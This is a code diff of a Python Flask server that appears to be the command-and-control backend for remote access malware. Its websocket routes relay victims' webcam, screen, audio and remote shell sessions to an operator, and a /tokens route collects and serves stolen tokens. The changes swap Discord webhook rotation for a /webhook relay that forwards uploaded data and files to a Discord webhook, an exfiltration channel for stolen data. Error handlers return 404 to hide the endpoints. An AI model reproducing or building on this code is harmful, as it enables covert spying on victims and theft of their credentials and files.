@@ -1,4 +1,6 @@
-import multiprocessing, threading, requests, hashlib, urllib3, zipfile, random, flask, json, time, os
+import multiprocessing, cloudscraper, threading, hashlib, urllib3, zipfile, random, flask, json, time, os
+
+scraper = cloudscraper.create_scraper()
 
 while True:
     try:
@@ -14,7 +16,7 @@ app = Flask(__name__)
 sock = Sock(app)
 command = {}
 
-shell_commands = {}
+shell_commands = {}                
 shell_response = {}
 
 screen_recv_ws = {}
@@ -23,73 +25,6 @@ audio_recv_ws = {}
 
 key = os.environ["key"]
 connectedComputers = []
-
-
-channel_id = os.environ["channel_id"]
-channel_id2 = os.environ["channel_id2"]
-
-
-headers = {
-    "content-Type": "application/json",
-    "user-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
-    "authorization": os.environ["token"],
-}
-
-
-def clear(webhooks):
-    time.sleep(30)
-    print("Deleting webhooks")
-    for webhook in webhooks:
-        webhook = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
-        requests.delete(webhook, headers=headers, verify=False)
-    print("Deleted all webhooks successfully")
-    for _ in range(10):
-        while True:
-            try:
-                create_webhook(channel_id, timeout=60)
-                break
-            except:
-                pass
-
-
-def log_webhook_creation(webhook, ip):
-    requests.post(
-        os.environ["webhook_generation_logs"],
-        data={"content": f"{ip} has generated a new webhook {webhook}"},
-    )
-
-
-def create_webhook(channel, timeout=10):
-    response = requests.post(
-        f"https://discord.com/api/v9/channels/{channel}/webhooks",
-        json={"name": "Captain Hook"},
-        headers=headers,
-        verify=False,
-        timeout=timeout,
-    ).json()
-    return response
-
-
-def get_webhooks(channel):
-    try:
-        return requests.get(
-            f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
-        ).json()
-    except:
-        return None
-
-
-def get_webhook():
-    response = {"code": 30007}
-    while True:
-        response = create_webhook(channel_id)
-
-    if 'id' not in response:
-      return None
-
-    print(f"https://discord.com/api/webhooks/{response['id']}/{response['token']}")
-    return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
-
 
 def zipdir(path, ziph):
     for root, dirs, files in os.walk(path):
@@ -130,7 +65,7 @@ def commands(ws):
     print("User Connected")
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
-    
+
     if not encoded == key:
         print("Client provided invalid key")
         ws.close()
@@ -172,7 +107,7 @@ def wscamera(ws):
 
     if not computer in camera_recv_ws:
       camera_recv_ws[computer] = []
-      
+
     while True:
         image = ws.receive()
         for _ws in camera_recv_ws[computer]:
@@ -195,7 +130,7 @@ def wsscreen(ws):
 
     if not computer in screen_recv_ws:
       screen_recv_ws[computer] = []
-  
+
     while True:
         image = ws.receive()
         for _ws in screen_recv_ws[computer]:
@@ -213,12 +148,12 @@ def wsaudio(ws):
 
     if not encoded == key:
         ws.close()
-        
+
     computer = ws.receive()
-  
+
     if not computer in audio_recv_ws:
       audio_recv_ws[computer] = []
-      
+
     while True:
         image = ws.receive()
         for _ws in audio_recv_ws[computer]:
@@ -239,18 +174,18 @@ def camera(ws):
         ws.close()
 
     computer = ws.receive()
-  
+
     if not computer in camera_recv_ws:
-      camera_recv_ws[computer] = []
-      
+        camera_recv_ws[computer] = []
+
     camera_recv_ws[computer].append(ws)
     while True:
-      try:
-       ws.receive()
-      except:
-        del camera_recv_ws[computer]
-        return
-        
+        try:
+            ws.receive()
+        except:
+            camera_recv_ws[computer].remove(ws)
+            return
+
 @sock.route("/api/ws/showScreen")
 def screen(ws):
     global screen_recv_ws
@@ -264,14 +199,14 @@ def screen(ws):
 
     if not computer in screen_recv_ws:
       screen_recv_ws[computer] = []
-  
+
     screen_recv_ws[computer].append(ws)
     while True:
-      try:
-       ws.receive()
-      except:
-        del screen_recv_ws[computer]
-        return
+        try:
+            ws.receive()
+        except:
+            screen_recv_ws[computer].remove(ws)
+            return
 
 
 @sock.route("/api/ws/playAudio")
@@ -290,14 +225,14 @@ def audio(ws):
 
     if not computer in screen_recv_ws:
       screen_recv_ws[computer] = []
-  
+
     audio_recv_ws[computer].append(ws)
     while True:
-      try:
-       ws.receive()
-      except:
-        del audio_recv_ws[computer]
-        return
+        try:
+            ws.receive()
+        except:
+            audio_recv_ws[computer].remove(ws)
+            return
 
 def update(ws):
     global connectedComputers
@@ -393,42 +328,53 @@ def shell(ws):
 
 
 @app.route("/webhook", methods=["POST", "GET"])
-def webhook():
-    try:
-        request.form["key"]
-    except:
-        return "", 404
-    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
-    if not encoded == key:
-        return "", 404
+def webhook():  
+    webhook = os.environ['webhook']
 
-    @flask.after_this_request
-    def process_after_request(response):
-        @response.call_on_close
-        def process_after_request():
-            if not backup:
-              print("Waiting 60 seconds before deletion")
-              time.sleep(60)
-              requests.delete(webhook, headers=headers)
-              print(f"Deleted {webhook}")
-
-        return response
 
     if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
         ip = request.environ["REMOTE_ADDR"]
     else:
         ip = request.environ["HTTP_X_FORWARDED_FOR"]
 
-    backup = False
+    if request.method == "GET":
 
-    webhook = get_webhook()
-    log_webhook_creation(webhook, ip)
-    if not webhook:
-      backup = True
-      webhook = os.environ["backup_webhook"]
+        response = scraper.get(webhook).text
+        print(response)
+        return response
 
+    elif request.method == "POST":
+        data = request.form
+        try:
+            data = dict(request.get_json(force=True))
+            is_json = True
+        except Exception as e:
+            data = dict(request.form)
+            is_json = False
 
-    return webhook
+        try:
+           files = dict(request.files)
+        except Exception as e:
+           files = {}
+
+        if files:
+          try:
+              files = {'file': (key, file.read()) for key, file in files.items()}
+          except Exception as e:
+              files = {}
+              print(e, 5)
+
+        if is_json:
+            response = scraper.post(webhook, json=data, files=files)
+        else:
+            response = scraper.post(webhook, data=data, files=files)
+
+        print(is_json, data, response.text)
+        if response:
+            return response.text, response.status_code
+
+        else:
+            return {}, 200
 
 
 @app.route("/logs", methods=["POST", "GET"])
@@ -488,12 +434,12 @@ def tokens():
               keysFile["keys"] = keys
               json.dump(keysFile, f, indent=1)
               f.close()
-            
+
         return "", 204
 
     elif request.method == "GET":
         keysFile = json.load(open("tokens.json", "r"))
-      
+
         keys = keysFile["keys"]
         return keys
 
@@ -510,19 +456,21 @@ def page_not_found(e):
 
 @app.errorhandler(500)
 def error(e):
+    print(e)
     return "", 404
 
 
 @app.errorhandler(405)
 def notallowed(e):
+    print(e)
     return "", 404
 
 
 @app.errorhandler(400)
 def notallowed(e):
+    print(e, 400)
     return "", 404
 
 
 if __name__ == "__main__":
-    # Run the Flask app
     app.run(host="0.0.0.0", debug=True, port=8080)
